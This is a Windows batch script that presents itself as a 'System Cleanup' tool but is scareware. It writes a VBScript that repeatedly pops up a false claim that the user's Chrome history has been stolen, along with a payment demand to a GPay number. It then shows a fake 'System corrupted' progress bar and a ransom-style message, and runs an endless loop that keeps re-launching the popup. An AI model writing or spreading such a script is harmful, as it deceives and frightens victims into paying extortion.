@echo off
:: Create popup.vbs
echo Set shell = CreateObject("WScript.Shell") > popup.vbs
echo For i = 1 To 10 >> popup.vbs
echo shell.Popup "😈 I got your Chrome history! Pay GPay: 6283838878", 3, "System Hack", 64 >> popup.vbs
echo Next >> popup.vbs

:: Simulate loading
title 🕷️ System Cleanup by SpideyFalcon...
color 0A
cls

echo Initializing system cleanup...
timeout /t 2 >nul

for /L %%i in (1,1,100) do (
    cls
    echo System corrupted... Loading %%i%%
    timeout /t 1 >nul
)

:: Final message
cls
echo [⚠️] Your Chrome history has been corrupted by SpideyFalcon.
echo Contact: GPay 6283838878
echo.
pause

:: Watchdog loop — popup if closed
:loop
tasklist | find /i "cmd.exe" >nul
if errorlevel 1 (
    wscript popup.vbs
    goto loop
)
goto loop
